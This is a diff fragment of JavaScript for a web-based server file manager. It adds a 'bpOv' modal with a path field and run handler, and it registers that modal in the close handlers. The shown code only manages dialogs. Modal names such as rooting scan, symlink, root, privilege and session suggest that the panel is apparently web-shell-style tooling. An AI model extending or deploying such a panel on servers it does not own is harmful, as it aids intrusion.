+  if(!p.value)p.value=(typeof CWD!=='undefined'&&CWD)?CWD:'/';
+  openMod('bpOv');
+  bpLoadFacts();
+});
+bpEl('bpPath')?.addEventListener('keydown',e=>{if(e.key==='Enter'){bpRun();}});
+/* <<BPJS-END>> */
 function openMod(id){document.getElementById(id)?.classList.add('open');}
 function closeMod(id){document.getElementById(id)?.classList.remove('open');if(id==='configInspectorOv'&&typeof resetConfigInspectorView==='function')resetConfigInspectorView();if(id==='rootingScanOv'&&typeof resetRootingScanView==='function')resetRootingScanView();}
 document.addEventListener('keydown',e=>{
   if(e.key!=='Escape')return;
-  ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv','privOv','sessOv','guardOv','sfgOv','ownOv','rootOv'].forEach(closeMod);
+  ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv','privOv','sessOv','guardOv','sfgOv','ownOv','rootOv','bpOv'].forEach(closeMod);
   closeSheet();closeCtx();
 });
-['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv','ownOv','rootOv'].forEach(id=>{
+['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv','ownOv','rootOv','bpOv'].forEach(id=>{
   document.getElementById(id)?.addEventListener('click',e=>{if(e.target===document.getElementById(id))closeMod(id);});
 });
 document.getElementById('fileInfoClose')?.addEventListener('click',()=>closeMod('fileInfoOv'));
